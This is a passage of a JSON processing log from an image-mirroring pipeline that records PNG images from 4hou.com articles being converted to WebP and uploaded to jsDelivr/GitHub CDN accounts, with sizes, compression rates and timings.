KB","compressRate":"112.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526448123019.png","sourceStatusCode":200,"destWidth":694,"destHeight":128,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn60@2020_1/2020/08/25/10-02-03-177_538a60e9bd6097fa.webp","sourceBytes":11180,"destBytes":7790,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3882,"convertSpendMs":6,"createdTime":"2020-08-25 18:02:00","host":"us-014*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"10.9 KB","destSize":"7.6 KB","compressRate":"69.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730211610544.png","sourceStatusCode":200,"destWidth":665,"destHeight":742,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn40@2020_2/2020/08/25/10-02-02-998_d4f936f3d7ac2ebc.webp","sourceBytes":21195,"destBytes":100386,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3901,"convertSpendMs":25,"createdTime":"2020-08-25 18:02:00","host":"us-030*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.7 KB","destSize":"98 KB","compressRate":"473.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526449163918.png","sourceStatusCode":200,"destWidth":802,"destHeight":73,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn8@2020_2/2020/08/25/10-02-03-346_34f2d15f18780a06.webp","sourceBytes":3118,"destBytes":6692,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1883,"convertSpendMs":8,"createdTime":"2020-08-25 18:02:02","host":"us-018*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3 KB","destSize":"6.5 KB","compressRate":"214.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730012408042.png","sourceStatusCode":200,"destWidth":977,"destHeight":511,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn72@2020_4/2020/08/25/10-02-03-040_c10f3f9ed3fe18ae.webp","sourceBytes":16600,"destBytes":28610,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3926,"convertSpendMs":19,"createdTime":"2020-08-25 18:02:00","host":"europe-23*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"16.2 KB","destSize":"27.9 KB","compressRate":"172.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526454707885.png","sourceStatusCode":200,"destWidth":1966,"destHeight":466,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn11@2020_5/2020/08/25/10-02-03-622_9806c987ceb6c474.webp","sourceBytes":45226,"destBytes":31184,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2281,"convertSpendMs":41,"createdTime":"2020-08-25 18:02:02","host":"us-006*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"44.2 KB","destSize":"30.5 KB","compressRate":"69%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730183574110.png","sourceStatusCode":200,"destWidth":1277,"destHeight":491,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn20@2020_5/2020/08/25/10-02-03-795_6885fc1b2741e197.webp","sourceBytes":62432,"destBytes":62628,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4625,"convertSpendMs":41,"createdTime":"2020-08-25 18:02:00","host":"us-026*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"61 KB","destSize":"61.2 KB","compressRate":"100.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730050842222.png","sourceStatusCode":200,"destWidth":992,"destHeight":172,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn24@2020_1/2020/08/25/10-02-03-996_cd4e7c19b62603f2.webp","sourceBytes":31336,"destBytes":20380,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2251,"convertSpendMs":63,"createdTime":"2020-08-25 18:02:02","host":"us-035*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30.6 KB","destSize":"19.9 KB","compressRate":"65%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526452191128.png","sourceStatusCode":200,"destWidth":1930,"destHeight":262,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn79@2020_2/2020/08/25/10-02-04-042_0696cdcf705bb0a3.webp","sourceBytes":34467,"destBytes":31086,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4840,"convertSpendMs":45,"createdTime":"2020-08-25 18:02:00","host":"us-018*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"33.7 KB","destSize":"30.4 KB","compressRate":"90.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526451141189.png","sourceStatusCode":200,"destWidth":2444,"destHeight":694,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn91@2020_6/2020/08/25/10-02-03-908_70e5c603819b6660.webp","sourceBytes":141548,"destBytes":97928,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4889,"convertSpendMs":179,"createdTime":"2020-08-25 18:02:00","host":"us-002*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"138.2 KB","destSize":"95.6 KB","compressRate":"69.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730163190455.png","sourceStatusCode":200,"destWidth":805,"destHeight":559,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn43@2020_4/2020/08/25/10-02-03-622_e03175ff078195d9.webp","sourceBytes":40690,"destBytes":45186,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4791,"convertSpendMs":20,"createdTime":"2020-08-25 18:02:00","host":"europe-23*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"39.7 KB","destSize":"44.1 KB","compressRate":"111%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526450573382.png","sourceStatusCode":200,"destWidth":2224,"destHeight":714,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn43@2020_5/2020/08/25/10-02-04-016_fdd228156ebf4ae1.webp","sourceBytes":147719,"destBytes":106296,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4918,"convertSpendMs":95,"createdTime":"2020-08-25 18:02:00","host":"us-018*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"144.3 KB","destSize":"103.8 KB","compressRate":"72%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730228113723.png","sourceStatusCode":200,"destWidth":1291,"destHeight":650,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn56@2020_4/2020/08/25/10-02-03-849_9fa5c4e13ef0775b.webp","sourceBytes":54036,"destBytes":131162,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4938,"convertSpendMs":86,"createdTime":"2020-08-25 18:02:00","host":"us-026*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"52.8 KB","destSize":"128.1 KB","compressRate":"242.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347626998550.png","sourceStatusCode":200,"destWidth":830,"destHeight":508,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn52@2020_3/2020/08/25/10-02-04-263_a557ca8c58b04b42.webp","sourceBytes":285511,"destBytes":37740,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5061,"convertSpendMs":36,"createdTime":"2020-08-25 18:02:00","host":"us-039*","referer":"https://www.4hou.com/posts/MoV3","linkMd5ListStr":"719d0e33d92b39b5ce9b86bc27274aa0","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"278.8 KB","destSize":"36.9 KB","compressRate":"13.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730193116050.png","sourceStatusCode":200,"destWidth":691,"destHeight":288,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn7@2020_3/2020/08/25/10-02-04-033_aab6a4d246a974b8.webp","sourceBytes":5640,"destBytes":20446,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4963,"convertSpendMs":9,"createdTime":"2020-08-25 18:02:00","host":"europe-23*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"5.5 KB","destSize":"20 KB","compressRate":"362.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526455149065.png","sourceStatusCode":200,"destWidth":2266,"destHeight":726,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn51@2020_6/2020/08/25/10-02-03-788_ca9e55a7bc64cd9a.webp","sourceBytes":138614,"destBytes":88600,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4992,"convertSpendMs":66,"createdTime":"2020-08-25 18:02:00","host":"europe69*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"135.4 KB","destSize":"86.5 KB","compressRate":"63.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347678526314.png","sourceStatusCode":200,"destWidth":830,"destHeight":466,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn24@2020_6/2020/08/25/10-02-04-303_c9d9650c768f4a4b.webp","sourceBytes":412181,"destBytes":49812,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5137,"convertSpendMs":35,"createdTime":"2020-08-25 18:02:00","host":"us-014*","referer":"https://www.4hou.com/posts/MoV3","linkMd5ListStr":"719d0e33d92b39b5ce9b86bc27274aa0","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"402.5 KB","destSize":"48.6 KB","compressRate":"12.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730064479790.png","sourceStatusCode":200,"destWidth":1001,"destHeight":407,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn27@2020_2/2020/08/25/10-02-04-377_efcd714fdb2f53c5.webp","sourceBytes":36054,"destBytes":22228,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5179,"convertSpendMs":19,"createdTime":"2020-08-25 18:02:00","host":"us-002*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"35.2 KB","destSize":"21.7 KB","compressRate":"61.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730202424730.png","sourceStatusCode":200,"destWidth":855,"destHeight":916,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn68@2020_3/2020/08/25/10-02-03-580_68e0da731761da29.webp","sourceBytes":37516,"destBytes":173106,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5054,"convertSpendMs":39,"createdTime":"2020-08-25 18:02:00","host":"europe65*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"36.6 KB","destSize":"169 KB","compressRate":"461.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326438107127.png","sourceStatusCode":200,"destWidth":637,"destHeight":483,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn31@2020_5/2020/08/25/10-02-04-205_a8ec5aab394a8077.webp","sourceBytes":120469,"destBytes":26910,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5193,"convertSpendMs":20,"createdTime":"2020-08-25 18:02:00","host":"europe65*","referer":"https://www.4hou.com/posts/GgV0","linkMd5ListStr":"dd7b3dd3eff4e15f8e30d58cdd7a3d00","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"117.6 KB","destSize":"26.3 KB","compressRate":"22.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526448495351.png","sourceStatusCode":200,"destWidth":1922,"destHeight":1138,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn83@2020_5/2020/08/25/10-02-04-578_8edae2b8edb0aa51.webp","sourceBytes":196007,"destBytes":170152,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3260,"convertSpendMs":102,"createdTime":"2020-08-25 18:02:02","host":"us-026*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"191.4 KB","destSize":"166.2 KB","compressRate":"86.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526452730835.png","sourceStatusCode":200,"destWidth":580,"destHeight":432,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn4@2020_4/2020/08/25/10-02-04-953_b44af07448b1ec6b.webp","sourceBytes":37386,"destBytes":29492,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3697,"convertSpendMs":13,"createdTime":"2020-08-25 18:02:02","host":"us-030*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"36.5 KB","destSize":"28.8 KB","compressRate":"78.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729955440323.png","sourceStatusCode":200,"destWidth":1162,"destHeight":766,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn88@2020_4/2020/08/25/10-02-04-786_a18ed8eaf2c96a0e.webp","sourceBytes":59436,"destBytes":78818,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5676,"convertSpendMs":38,"createdTime":"2020-08-25 18:02:00","host":"us-014*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"58 KB","destSize":"77 KB","compressRate":"132.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526456687555.png","sourceStatusCode":200,"destWidth":2898,"destHeight":750,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn80@2020_2/2020/08/25/10-02-04-793_7a69e560c51cbf23.webp","sourceBytes":165587,"destBytes":116926,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5723,"convertSpendMs":98,"createdTime":"2020-08-25 18:02:00","host":"us-039*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"161.7 KB","destSize":"114.2 KB","compressRate":"70.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730328888874.png","sourceStatusCode":200,"destWidth":1351,"destHeight":685,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn12@2020_1/2020/08/25/10-02-04-162_f151f87a2ce90812.webp","sourceBytes":32666,"destBytes":157826,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5652,"convertSpendMs":41,"createdTime":"2020-08-25 18:02:00","host":"europe61*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.9 KB","destSize":"154.1 KB","compressRate":"483.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730175188690.png","sourceStatusCode":200,"destWidth":1108,"destHeight":645,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn15@2020_2/2020/08/25/10-02-04-911_70b18585f96f2fb0.webp","sourceBytes":47557,"destBytes":69830,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5810,"convertSpendMs":42,"createdTime":"2020-08-25 18:02:00","host":"us-039*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"46.4 KB","destSize":"68.2 KB","compressRate":"146.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347625303236.png","sourceStatusCode":200,"destWidth":828,"destHeight":500,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn27@2020_1/2020/08/25/10-02-04-631_f98cc3752d4eaeb0.webp","sourceBytes":223555,"destBytes":27306,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2629,"convertSpendMs":45,"createdTime":"2020-08-25 18:02:02","host":"us-022*","referer":"https://www.4hou.com/posts/MoV3","linkMd5ListStr":"719d0e33d92b39b5ce9b86bc27274aa0","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"218.3 KB","destSize":"26.7 KB","compressRate":"12.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730023837775.png","sourceStatusCode":200,"destWidth":843,"destHeight":912,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn32@2020_3/2020/08/25/10-02-04-927_a85a09481494ddbc.webp","sourceBytes":35818,"destBytes":198762,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3055,"convertSpendMs":42,"createdTime":"2020-08-25 18:02:03","host":"us-010*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"35 KB","destSize":"194.1 KB","compressRate":"554.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730288191130.png","sourceStatusCode":200,"destWidth":1121,"destHeight":788,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn47@2020_5/2020/08/25/10-02-04-660_7ef5c9b1dbecce3c.webp","sourceBytes":55802,"destBytes":178934,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6222,"convertSpendMs":47,"createdTime":"2020-08-25 18:02:00","host":"europe61*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"54.5 KB","destSize":"174.7 KB","compressRate":"320.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526446145469.png","sourceStatusCode":200,"destWidth":630,"destHeight":884,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn15@2020_3/2020/08/25/10-02-05-364_ac3f7d1cc1131dab.webp","sourceBytes":15083,"destBytes":27468,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4102,"convertSpendMs":28,"createdTime":"2020-08-25 18:02:02","host":"europe69*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"14.7 KB","destSize":"26.8 KB","compressRate":"182.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729973446777.png","sourceStatusCode":200,"destWidth":1078,"destHeight":731,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn95@2020_4/2020/08/25/10-02-05-267_f3ff403ea8c42594.webp","sourceBytes":70447,"destBytes":61742,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6338,"convertSpendMs":36,"createdTime":"2020-08-25 18:02:00","host":"europe65*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"68.8 KB","destSize":"60.3 KB","compressRate":"87.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347624191329.png","sourceStatusCode":200,"destWidth":830,"destHeight":384,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn75@2020_3/2020/08/25/10-02-06-278_9dc4750ebc7be5e0.webp","sourceBytes":66456,"destBytes":22386,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7143,"convertSpendMs":13,"createdTime":"2020-08-25 18:02:00","host":"europe61*","referer":"https://www.4hou.com/posts/MoV3","linkMd5ListStr":"719d0e33d92b39b5ce9b86bc27274aa0","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"64.9 KB","destSize":"21.9 KB","compressRate":"33.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326389210281.png","sourceStatusCode":200,"destWidth":534,"destHeight":405,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn36@2020_4/2020/08/25/10-02-06-467_d40485c8b39d1cf9.webp","sourceBytes":7708,"destBytes":10154,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4025,"convertSpendMs":9,"createdTime":"2020-08-25 18:02:03","host":"europe-23*","referer":"https://www.4hou.com/posts/GgV0","linkMd5ListStr":"dd7b3dd3eff4e15f8e30d58cdd7a3d00","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.5 KB","destSize":"9.9 KB","compressRate":"131.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526454194498.png","sourceStatusCode":200,"destWidth":1064,"destHeight":264,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn19@2020_3/2020/08/25/10-02-06-410_77e494ffe6ec8a48.webp","sourceBytes":22482,"destBytes":18348,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5052,"convertSpendMs":11,"createdTime":"2020-08-25 18:02:02","host":"europe-57*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"22 KB","destSize":"17.9 KB","compressRate":"81.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730347385423.png","sourceStatusCode":200,"destWidth":1445,"destHeight":485,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn39@2020_6/2020/08/25/10-02-06-660_3c417a4716867dd7.webp","sourceBytes":28628,"destBytes":158178,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4895,"convertSpendMs":37,"createdTime":"2020-08-25 18:02:03","host":"europe61*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"28 KB","destSize":"154.5 KB","compressRate":"552.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347653948129.png","sourceStatusCode":200,"destWidth":830,"destHeight":484,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn63@2020_5/2020/08/25/10-02-09-290_4e296f5e14774143.webp","sourceBytes":428186,"destBytes":25114,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":10032,"convertSpendMs":32,"createdTime":"2020-08-25 18:02:00","host":"us-002*","referer":"https://www.4hou.com/posts/MoV3","linkMd5ListStr":"719d0e33d92b39b5ce9b86bc27274aa0","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"418.2 KB","destSize":"24.5 KB","compressRate":"5.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526452200177.png","sourceStatusCode":200,"destWidth":1188,"destHeight":542,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn64@2020_1/2020/08/25/10-02-12-659_9314b8455c93da32.webp","sourceBytes":21089,"destBytes":22902,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":13627,"convertSpendMs":56,"createdTime":"2020-08-25 18:02:00","host":"us-022*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.6 KB","destSize":"22.4 KB","compressRate":"108.6%"}],"successGithubMap":{"myreaderx8":2,"myreaderx14":1,"myreaderx15":2,"myreaderx7":2,"myreaderx16":2,"myreaderx6":2,"myreaderx4":2,"myreaderx10":2,"myreaderx32":2,"myreaderx11":2,"myreaderx3":2,"myreaderx33":2,"myreaderx12":2,"myreaderx2":2,"myreaderx1":2,"myreaderx13":2,"myreaderx30":1,"myreaderx31":2,"myreaderx18":2,"myreaderx19":2,"myreaderx":2,"myreaderx25":2,"myreaderx27":2,"myreaderx21":2,"myreaderx22":2,"myreaderx23":2,"myreaderx24":2,"myreaderx5oss":2,"myreaderx29":2},"failGithubMap":{}}